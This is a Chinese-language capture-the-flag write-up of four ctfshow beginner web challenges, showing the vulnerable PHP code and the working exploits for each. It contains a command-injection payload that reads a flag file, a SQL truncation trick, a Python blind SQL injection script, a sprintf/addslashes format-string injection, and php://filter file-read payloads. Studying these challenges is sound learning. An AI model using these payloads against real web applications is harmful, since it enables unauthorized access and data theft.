---
title: ctfshow 萌新赛web
categories: 赛题wp
---
## 签到
- 考点：代码审计

<!--more-->
```bash

 <?php 
 if(isset($_GET['url'])){
        system("curl https://".$_GET['url'].".ctf.show");
 }else{
         show_source(__FILE__);
 }
  ?>
 ```

闭合前后语句即可



```
payload:  ;ls;  --> ;cat flag;
```

---
## 假赛生
- 考点：sql约束攻击

```bash

<?php
session_start();
include('config.php');
if(empty($_SESSION['name'])){
    show_source("index.php");
}else{
    $name=$_SESSION['name'];
    $sql='select pass from user where name="'.$name.'"';
    echo $sql."<br />";
    system('4rfvbgt56yhn.sh');
    $query=mysqli_query($conn,$sql);
    $result=mysqli_fetch_assoc($query);
    if($name==='admin'){
        echo "admin!!!!!"."<br />";
        if(isset($_GET['c'])){
            preg_replace_callback("/\w\W*/",function(){die("not allowed!");},$_GET['c'],1);
            echo $flag;
        }else{
            echo "you not admin";
        }
    }
}
?>

```
根据hint 进入register.php  login.php

观察源码发现name===admin时进行下一步

先注册admin发现已经有此用户
尝试sql约束攻击  注册`‘admin ’`

登录‘admin’  登陆成功

绕过正则：
>\w	匹配字母或数字或下划线 *	重复零次或更多次
\W	匹配任意不是字母，数字，下划线，汉字的字符

```
  Payload:  ?c=?
```

---
##  萌新记忆
- 考点：布尔盲注+脚本

扫后台：

![](https://img-blog.csdnimg.cn/20210301174644381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
应该是sql

![](https://img-blog.csdnimg.cn/20210301174659628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
抓包

![](https://img-blog.csdnimg.cn/202103011747175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
测试：
- =被过滤
- or被过滤： 使用 `||` 绕过
- #和–被过滤：使用单引号闭合最后的单引号

推测语句为：

```bash
  SELECT password FROM user WHERE username=''||length(password)<5
  SELECT password FROM user WHERE username=''||substr(password,1,1)<'g';
```
构造：
```
   '||length(p)<'18 返回密码错误 说明密码长度为17
   '||substr(p,1,1)<'a：猜解字段。
```

脚本：

```bash

import requests

url="http://7be015eb-869b-4348-8c62-c30b565cb3b1.chall.ctf.show:8080/admin/checklogin.php"
flag=""

for i in range(18):
    for j in '0123456789abcdefghijklmnopqrstuvwxyz':
        data={"u":"'||substr(p,{},1)<'{}".format(i,j),
              "p":""
              }
        c=requests.post(url=url,data=data)
        if '用户名' not in c.text:
            flag+=chr(ord(j)-1)
            print(flag)
            break
```
密码：cptbtptpbcptdtptp   登录可得flag

---
## 给她
- 考点：git泄露+伪协议+ sprintf 函数漏洞

![](https://img-blog.csdnimg.cn/20210301175113965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
dir扫一下

![](https://img-blog.csdnimg.cn/2021030117513142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Githack  url+.git/

![](https://img-blog.csdnimg.cn/20210301175200385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
发现 hint.php:

```bash

<?php
  $pass=sprintf("and pass='%s'",addslashes($_GET['pass']));
  $sql=sprintf("select * from user where name='%s' $pass",addslashes($_GET['name']));
?>

```

sprintf和addslashes有个漏洞

[从WordPress SQLi谈PHP格式化字符串问题](https://paper.seebug.org/386/#0x02)


addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。

```
  预定义字符是：
   • 单引号（'）
   • 双引号（"）
   • 反斜杠（\）
   • NULL
```

sprintf() 函数把格式化的字符串写入变量中。

```
可能的格式值：
 •	%% - 返回一个百分号 %
 •	%b - 二进制数
 •	%c - ASCII 值对应的字符
 •	%d - 包含正负号的十进制数（负数、0、正数）
 •	%e - 使用小写的科学计数法（例如 1.2e+2）
 •	%E - 使用大写的科学计数法（例如 1.2E+2）
 •	%u - 不包含正负号的十进制数（大于等于 0）
 •	%f - 浮点数（本地设置）
 •	%F - 浮点数（非本地设置）
 •	%g - 较短的 %e 和 %f
 •	%G - 较短的 %E 和 %f
 •	%o - 八进制数
 •	%s - 字符串
 •	%x - 十六进制数（小写字母）
 •	%X - 十六进制数（大写字母）

```

利用payload：
```
  ?name=1&pass=%1$' or 1%23
```

![](https://img-blog.csdnimg.cn/20210301175613982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
构造：pass=`%1$’` or 1# 变为  `%1$\’`  即 `‘`  变成：

select * from user where name='admin' and pass=''or 1 #’


成功跳转：

![](https://img-blog.csdnimg.cn/20210301175658909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
查看源码：

得到提示  flag在/flag

![](https://img-blog.csdnimg.cn/20210301175712453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
刷新抓包：

![](https://img-blog.csdnimg.cn/20210301175743696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
看到file 应该存在文件包含漏洞

16进制解码为：flag.xtt

![](https://img-blog.csdnimg.cn/20210301175801953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
访问flga.txt

![](https://img-blog.csdnimg.cn/20210301175817838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
确认存在

利用伪协议读取文件同时要转十六进制：
 Php://filter/read=convert,base64-encode/resource=/flag

![](https://img-blog.csdnimg.cn/20210301175847587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
使用rot13 试一试 :

```bash
php://filter/read=string.rot13/resource=/flag
```

![](https://img-blog.csdnimg.cn/20210301175907888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

